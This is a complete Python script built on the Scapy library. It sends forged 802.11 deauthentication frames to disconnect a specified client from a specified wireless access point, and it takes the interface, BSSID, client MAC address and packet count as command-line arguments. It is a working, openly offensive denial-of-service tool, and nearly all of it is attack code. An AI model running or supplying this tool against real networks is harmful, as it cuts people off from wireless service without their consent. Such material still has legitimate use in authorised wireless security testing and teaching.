#!/usr/bin/env python

from scapy.all import *
import sys

def deauth(iface,bssid,client,count):
   packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
   for n in range(int(count)):
      sendp(packet)
      print('Deauth sent via: '+iface+' to BSSID: '+bssid+' for Client: '+client)


if __name__ == "__main__":
   if len(sys.argv) !=5:
      print('Usuage is - ./deauth.py interface bssid client count')
      print('Example - ./deauth.py wlan0mon 00:11:22:33:44:55 55:44:33:22:11:00 4')
      sys.exit(1)

   # The interface that you want to send packets out of (monitor mode)
   conf.iface = sys.argv[1]
   # the BSSID of the Wireless Access Point you want to target
   bssid = sys.argv[2]
   # The MAC address of the Client you want to kick off the Access Point
   client = sys.argv[3] 
   # The number of deauth packets you want to send
   count = sys.argv[4] 
   # Used to supress scapy output return
   conf.verb = 0

   # run the deauth function
   deauth(conf.iface,bssid,client,count)